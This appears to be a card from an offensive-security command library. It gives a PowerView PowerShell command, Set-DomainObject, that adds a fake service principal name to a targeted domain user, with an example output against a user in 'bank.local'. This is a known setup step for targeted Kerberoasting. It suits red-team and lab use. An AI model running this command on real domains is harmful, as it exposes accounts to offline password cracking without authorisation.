---
id: 708787bf-73fb-482c-a277-ceb657eac155
name: PowerView Add SPN to a Domain User
type: command
executor: powershell
data: Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincipalname='nonexistent/$_DOMAIN'}
output: PS C:\> Set-DomainObject -Credential $Cred -Identity steve -SET @{serviceprincipalname='nonexistent/bank.local'}
created_at: '2020-06-25T20:16:48.076064+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PowerView Add SPN to a Domain User

```powershell
Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincipalname='nonexistent/$_DOMAIN'}
```

## Expected Output

```
PS C:\> Set-DomainObject -Credential $Cred -Identity steve -SET @{serviceprincipalname='nonexistent/bank.local'}
```
